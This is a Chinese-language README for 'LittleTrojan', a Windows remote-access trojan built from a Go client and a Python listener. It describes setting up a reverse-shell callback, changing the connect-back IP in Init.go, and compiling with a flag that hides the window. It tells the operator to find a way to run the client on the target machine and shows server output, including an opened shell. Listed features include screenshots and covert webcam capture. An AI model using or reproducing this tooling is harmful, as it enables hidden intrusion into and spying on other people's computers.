# Little Trojan
## LittleTrojan是什么
* 是一个利用Golang和Python实现的Windows远程控制工具。
* Client使用Golang实现，Server使用python实现，两者通过socket套接字通信。
* Client通过反向连接客户端来反弹shell。
* 最终实现的目的是替代或者等同metasploit、cobalt strike等渗透测试工具。

## LittleTrojan使用方法
* 你可能需要使用VPS或者内网穿透等转发工具，确保客户端能够反向连接到你。
* 目前仅为Demo版本，暂不支持加密通信和自定义生成木马，以后会进行功能完善。
* 在你的远程机器上运行客户端，需要安装相应的python版本。
```bash
# 不传入参数就可以查看详细的操作，当出现错误，会提示错误类型
python Server2.py

                    DreamShell ---> HELP DOCUMENT
                    -----------------------------
                    Launch service:   Server -a [--addr] (you ip) -p [--port] (your port)
                    when in command:   [command]
                    when in shell:  [cmd-shell]  or  [bash-shell]
                    -----------------------------
                    Some useful commands:
                    exit --> close the handler and stop the client process
                    restart --> restart the handler
                    screenshot --> take a screenshot on the screen
                    camerashot --> take a photo use the camera on the client
The addr or port seems not useful!
Please try again!

# 直接通过参数来指定监听的地址（0.0.0.0表示一切）和监听的端口（4433端口）（端口需要在Init.go中进行修改）
python Server2.py -a 0.0.0.0 -p 4433
0.0.0.0 4433
Service Launch! Listen on  0.0.0.0 : 4433
```
* 在Init.go文件中更改一下要连接的ip和端口
```go
client.connect("127.0.0.1", 4433)
```
* 在本地编译客户端或者在远程编译客户端，想办法在远程机器上面进行执行客户端。
```bash
go build GoTrojan -ldflags="-H windowsgui -w -s"
go_build_GoTrojan.exe
```
* 连接成功，服务端出现提示
```bash
0.0.0.0 4433
Service Launch! Listen on  0.0.0.0 : 4433
Starting convert with  ('127.0.0.1', 14083)
Tue May  2 09:38:13 2023
'127.0.0.1', 14083 (command)>shell
Starting shell.....
Tue May  2 09:38:22 2023
'127.0.0.1', 14083 (shell)>
```
